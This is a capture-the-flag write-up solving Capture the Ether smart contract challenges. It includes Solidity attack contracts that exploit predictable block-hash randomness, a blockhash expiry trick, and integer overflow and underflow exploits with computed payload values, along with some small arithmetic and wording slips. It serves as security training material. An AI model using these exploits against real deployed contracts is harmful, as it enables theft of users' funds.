# Capture The Ether WRITEUP


Writeup of the different challenges of [Capture the ether](https://capturetheether.com/)

# Warmup

## 2) Call Me

Pretty simple, you just call the function `callMe()`.

## 3) Choose a nickname

Again the challenge is simple, you call the function `setNickame()` with your nickname.
2 subtilities:
- One, you need to call `setNickname()` on the CaptureTheEther contract at address `0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee` and not the address given on the left.
- Two, you need to be sure to encode your nickname correctly. The contract check the leftmost character to see if its 0 or not so you need to be sure that your nickname is save as 0xYOURNICKNAMEINHEX00000000000000000000...0 instead of 0x00000000000000000000...0YOURNICKNAMEINHEX.

# Lotteries

## 4) Guess the number

Simply call `guess()` with 42 as argument and msg.value equal to 1 ether.

## 5) Guess the secret number

We need to find which uint8 has a keccak256 hash equal to the one save in the contract. We can easily brute force the solution with a loop:
```python
for i in range(2 ** 8):
    # if the hash matches, guess the number
    if Web3.solidityKeccak(["uint8"], [i]).hex().upper() == answerHash.upper():
        contract.guess(i, {"from": account, "value": ONE})
```
Then we send the transcation like the previous challenge.

## 6) Guess the random number

We need to find the number saved during the creation of the contract. Since the variable doesn't have the `public` visibility modifer, solidity didn't create a getter `answer()`, but we can still look at the contract storage and find the number:
```python
answer = int(w3.eth.get_storage_at(contract_address, 0).hex(), base=16)
```
Then we send the transcation like the previous challenge.

## 7) Guess the new number

Similar to the previous challenges, we need to find the right number, only now, the number is generated at the same time we are trying to guess it.
```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
```

To guess this number, we create an attack contract that will do the same calculation as the target contract and will then "guess" the correct answer. Since the calculations are done during the same transaction, they will have the same block.number and timestamp:
```solidity
uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
GuessTheNewNumber(target_contract).guess{value: msg.value}(answer);
payable(msg.sender).transfer(address(this).balance);
```
We need to slightly modify the syntax since we are using solidity version 0.8.0 so `now` becomes `block.timestamp` and `keccak(x,y)` become `keccak256(abi.encodePacked(x,y))`
Then our `attack()` function call the `guess()` function with a `msg.value` of `1 ether` and we then transfer the received ether to our EOA attacker address. We also need to make sure our attack contract has a `receive()` function to receive the ether from the target contract:
```solidity
receive() external payable {}
```


## 8) Predict the future

We need to guess a number between 0 and 9 (because of the `% 10`) and call `lockInGuess(uint8 n)`. Then with a different transaction, check wheter our guess was correct or not by calling `settle()`. The problem is, if the guess was wrong, we need to guess again and each guess cost us 1 ether:
```solidity
function lockInGuess(uint8 n) public payable {
    require(guesser == 0);
    require(msg.value == 1 ether); // need to pay 1 ether to guess

    guesser = msg.sender;
    guess = n;
    settlementBlockNumber = block.number + 1; 
}

function settle() public {
    require(msg.sender == guesser); // need to call lockInGuess() each time we settle
    require(block.number > settlementBlockNumber);// has to be a different transaction (and in a different block)

    uint8 answer = uint8(
        keccak256(block.blockhash(block.number - 1), now)
    ) % 10; // calculate the answer

    guesser = 0; //reset, so if the next line is wrong, we need to call lockInGuess() again
    if (guess == answer) {
        msg.sender.transfer(2 ether);
    }
}
```
The trick is to randomly guess a number, say 8, and then with a different transaction check whether that transaction will be in a block where the answer will be equal to our guess. If it is, we call `settle()` and win, if it's not, we simply abort the transaction, lost some gas fee, and try again.
```solidity
function attack() public returns (bool) {
    uint8 answer = uint8(
        uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp
                )
            )
        )
    ) % 10; // compute the answer just like the target contract will, with the same params (`block.number` and `block.timestamp`)
    require(answer == 8); // make sure our answer is correct, if not revert
    PredictTheFutureChallenge(target).settle(); // if its correct, we call settle()
    payable(msg.sender).transfer(address(this).balance);// and transfer our ether from our contract to our attacker address
}
```
Now we just need to send the same transaction where we call `attack()` until the tx goes through and we recover our ethers. We only lose some gas fee.



## 9) Predict the block hash

Same challenge as before, except we now need to guess the hash of the current block instead of a number modulo 8. Another difference is that the answer check the hash of the block our guess transaction was in (the one in which we call `lockInGuess(bytes32 hash)`) and not the current one. If we read the solidity docs on [blockhash](https://docs.soliditylang.org/en/v0.4.24/units-and-global-variables.html#block-and-transaction-properties), we see that they are only stored for 256 blocks, for scalability reasons, and after that `blockhash(blockNumber)` will return 0. so we know that the answer will be zero in the future, we can just guess zero, wait until the block number has increased by more than 256 (it takes about an hour) and make the contract check our answer.


# Math

## 10) Token sale

Here we need to create an overflow in the `buy()` function in order to increase our balance on the contract without sending that much ethers:
```solidity
require(msg.value == numTokens * PRICE_PER_TOKEN); // PRICE_PER_TOKEN = 10^18
```
We need to set `numTokens` to a value that will overflow `numTokens * PRICE_PER_TOKEN` so `msg.value` can be lower that what the contract think we sent. We need to overflow the righthand side of this `require`. We know that for an `uint256` an overflow happens at 2^256, which become zero. If we divide that number by 10^18 (since numTokens will be mul by 1 ether) we get a value `x` that will be multiply by 10^18 and cause an overflow. BUT, since we first divided by 10^18, we get a float number that will be floored when given to the contract so when we multiply that number by 10^18, we'll get a smaller number that before and there will be no overflow. So before sending that `x` number to the contract, we need to add 1 to it, so `x` time 10^18 will be bigger than 2^256. Here are the numbers:
```
# 2^256 = 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936
# /10^18 = 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457.584007913129639936
# take the floor = 11,579,208,923,731,619,542,357,098,500,868,790,785,326,998,466,564,056,403,9457 -> `x`
# +1 = 11,579,208,923,731,619,542,357,098,500,868,790,785,326,998,466,564,056,403,9458 -> `NumTokens`
# *10^18 = 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,458,000,000,000,000,000,000 -> what will happen in the require (will overflow) and need to be equal to msg.value
# MOD = 415,992,086,870,360,064 -> `msg.value`
```

## 11) Token whale

We can see that the private function `_transfer_()` does something strange. It never take an argument for the `from` of the transfer and assumes that the transfer comes from the `msg.sender`. This cause a problem in `transferFrom()` since it calls `_transfer()` which means the transfer is between the `msg.sender `and the `_to`, but the `msg.sender` balance is never checked for underflow. So when it reduces the balance of `msg.sender`, it can underflow and the `msg.sender` ends up with a huge balance.
```solidity
function transferFrom(
    address from,
    address to,
    uint256 value
) public {
    require(balanceOf[from] >= value); // check for underflow for `from` and not `msg.sender`
    require(balanceOf[to] + value >= balanceOf[to]);
    require(allowance[from][msg.sender] >= value);

    allowance[from][msg.sender] -= value;
    _transfer(to, value);
}
```